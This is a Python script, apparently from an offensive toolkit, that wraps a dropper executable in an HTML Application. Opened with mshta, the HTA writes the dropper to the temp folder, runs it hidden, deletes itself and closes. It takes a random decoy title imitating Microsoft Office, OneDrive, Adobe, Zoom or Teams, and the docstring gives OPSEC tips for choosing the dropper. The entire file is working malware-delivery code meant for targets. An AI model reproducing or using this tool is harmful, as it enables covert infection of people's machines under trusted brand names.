#!/usr/bin/env python3
"""
hostpayload_v2 HTA delivery wrapper.

Embeds a native dropper.exe as base64 inside an HTML Application (HTA).
At runtime the HTA writes the dropper to %TEMP% and executes it, then
removes itself. The resulting HTA file is served to the target and opened
with mshta.exe.

Usage:
    python3 delivery/hta.py --dropper build/dropper_staged.exe --output run.hta

For best OPSEC, use the staged dropper (a few KB) rather than the embedded
variant (100+ KB).
"""

import argparse
import base64
import os
import random
import string
import sys
from pathlib import Path


HTA_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
<title>__TITLE__</title>
<hta:application id="oHTA"
    applicationname="__APP__"
    border="none"
    borderstyle="normal"
    caption="no"
    maximizebutton="no"
    minimizebutton="no"
    showintaskbar="no"
    singleinstance="yes"
    sysmenu="no"
    windowstate="minimize"/>
<script language="JScript">
function decodeBase64ToBinary(b64) {
    var xml = new ActiveXObject("Microsoft.XMLDOM");
    var node = xml.createElement("base64");
    node.dataType = "bin.base64";
    node.text = b64;
    return node.nodeTypedValue;
}

function writeBinary(path, data) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Mode = 3;
    stream.Open();
    stream.Write(data);
    stream.SaveToFile(path, 2);
    stream.Close();
}

function run() {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var shell = new ActiveXObject("WScript.Shell");
        var temp = shell.ExpandEnvironmentStrings("%TEMP%");
        var dropper = temp + "\\__FILENAME__";
        var payload = "__PAYLOAD__";
        var data = decodeBase64ToBinary(payload);
        writeBinary(dropper, data);
        shell.Run('"' + dropper + '"', 0, false);
        try { fso.DeleteFile(location.pathname.replace(/^\\//, ""), true); } catch(e) {}
        window.close();
    } catch(e) {
        window.close();
    }
}
</script>
</head>
<body onload="run();">
__BODY__
</body>
</html>
"""


def random_name(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".exe"


def random_title() -> str:
    titles = [
        "Microsoft Office 365",
        "OneDrive - Personal",
        "Adobe Acrobat Reader",
        "Zoom Cloud Meetings",
        "Teams - Loading",
    ]
    return random.choice(titles)


def build_hta(dropper_bytes: bytes, filename: str | None = None) -> str:
    filename = filename or random_name()
    b64 = base64.b64encode(dropper_bytes).decode()
    chunked = "\n".join(b64[i : i + 256] for i in range(0, len(b64), 256))
    hta = HTA_TEMPLATE
    hta = hta.replace("__TITLE__", random_title())
    hta = hta.replace("__APP__", random_title().replace(" ", ""))
    hta = hta.replace("__FILENAME__", filename)
    hta = hta.replace("__PAYLOAD__", chunked)
    hta = hta.replace("__BODY__", f"<!-- {os.urandom(8).hex()} -->")
    return hta


def main() -> int:
    parser = argparse.ArgumentParser(description="Embed a dropper.exe in an HTA wrapper")
    parser.add_argument("--dropper", required=True, type=Path, help="dropper.exe to embed")
    parser.add_argument("--output", required=True, type=Path, help="output .hta file")
    parser.add_argument("--filename", help="filename used when written to %%TEMP%%")
    args = parser.parse_args()

    if not args.dropper.exists():
        print(f"[!] dropper not found: {args.dropper}", file=sys.stderr)
        return 1

    payload = args.dropper.read_bytes()
    if not payload:
        print("[!] dropper is empty", file=sys.stderr)
        return 1

    hta = build_hta(payload, args.filename)
    args.output.write_text(hta, encoding="utf-8")
    print(f"[+] wrote {args.output} ({len(hta)} chars, dropper {len(payload)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
